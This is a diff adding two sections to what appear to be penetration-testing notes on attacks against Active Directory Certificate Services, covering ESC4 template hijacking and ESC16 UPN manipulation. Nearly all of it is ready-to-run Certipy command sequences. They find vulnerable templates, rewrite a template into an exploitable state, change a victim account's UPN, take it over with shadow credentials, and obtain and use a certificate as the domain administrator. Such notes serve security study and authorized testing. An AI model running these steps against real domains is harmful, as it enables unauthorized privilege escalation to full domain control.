@@ -90,8 +90,124 @@ certipy auth -pfx <Certificate.pfx> -user <TargetUser> -dc-ip <DC-IP>
 
 After that, we receive a `TGT` and the user's `NTLM` hash.
 
+### ESC4 (Template Hijacking)
+Occurs when we have permission to modify a certificate template, allowing us to add a new template or modify an existing one. This can lead to the issuance of certificates for any user or computer account in the domain.
+
+By default, only high privileged users can modify certificate templates, but a misconfiguration can allow low-privileged users to modify them. 
+
+#### ESC4 Requirements
+If a user has `FullControl, WriteDacl, WriteOwner` or write property rights on attributes like `msPKI-Enrollment-Flag, msPKI-Certificate-Name-Flag, pKIExtendedKeyUsage, nTSecurityDescriptor`, they are likely to be able to modify the template.
+
+#### ESC4 Exploitation
+
+1. **Enumerate Certificate Templates**
+
+    ```bash
+    certipy find -u 'user@domain' -p 'Password' -vulnerable -stdout
+    ```
+
+2. **Modify the Template**
+
+    Certipy allows us to modify the template to a known vulnerable configuration. This can be done by writing a default configuration that allows low-privileged users to request certificates for any user, like the `ESC1` attack.
+
+    ```bash
+    certipy template \
+        -u 'user@domain' -p 'password' \
+        -dc-ip <DC-IP> -template 'VulnerableTemplate' \
+        -write-default-configuration
+    ```
+    
+    After that, if we enumerate the vulnerable templates once more, you will see that the template is now vulnerable to an `ESC1` attack.
+
+3. **Request a Certificate**
+
+    ```bash
+    certipy req \
+        -u 'user@domain' -p 'password' \
+        -dc-ip <DC-IP> -target 'TARGET FQDN' \
+        -ca 'Domain CA' -template 'VulnerableTemplate' \
+        -upn 'administrator@domain' 
+    ```
+
+4. **Authenticate with the Certificate**
+
+    ```bash
+    certipy auth \
+        -pfx <Certificate.pfx> \
+        -dc-ip <DC-IP>
+    ```
+
+### ESC16 (Security Extension Disabled on CA)
+
+Is identical to the mechanism used in `ESC9` attacks, where the end result is a certificate lacking the `SID` security extension, the difference is that in this case, any certificate template enabling client authentication can be used in the `UPN` manipulation attack.
+
+If we are an attacker with `GenericWrite` permissions over the `victim` account, and this account can enroll in any client authentication template, we can request a certificate for the `victim` account with a `UPN` of our choice.
+
+#### ESC16 Exploitation
+
+1. **Read UPN of the Victim Account**
+
+    ```bash
+    certipy account \
+        -u 'attacker@corp.local' -p 'Passw0rd!' \
+        -dc-ip '10.0.0.100' -user 'victim' \
+        read
+    ```
+
+2. **Update UPN of the Victim Account**
+
+    ```bash
+    certipy account \
+        -u 'attacker@corp.local' -p 'Passw0rd!' \
+        -dc-ip '10.0.0.100' -upn 'administrator' \
+        -user 'victim' update
+    ```
+
+3. **Obtain credentials for the Victim Account (Can be skipped if already known)**
+
+    ```bash
+    certipy shadow \
+        -u 'attacker@corp.local' -p 'Passw0rd!' \
+        -dc-ip '10.0.0.100' -account 'victim' \
+        auto
+    ```
+
+4. **Request a Certificate for the Victim Account**
+
+    4.1. **Set kerberos credential cache (KRB5CCNAME)**
+
+        ```bash
+        export KRB5CCNAME=victim.ccache
+        ```
+
+    4.2. **Request the certificate from any client authentication template (by default the 'User' template)**
+
+        ```bash
+        certipy req \
+            -k -dc-ip '10.0.0.100' \
+            -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
+            -template 'User'
+        ```
+
+5. **Revert UPN of the Victim Account**
+
+    ```bash
+    certipy account \
+        -u 'attacker@corp.local' -p 'Passw0rd!' \
+        -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
+        -user 'victim' update
+    ```
+
+6. **Authenticate with the Certificate**
+
+    ```bash
+    certipy auth \
+        -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
+        -username 'administrator' -domain 'corp.local'
+    ```
+
 ## References
 
 - [Hack the Box - ADCS](https://www.academy.hackthebox.com)
 - [Certified Pre-Owned SpecterOps](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
-
+- [Certipy - Wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
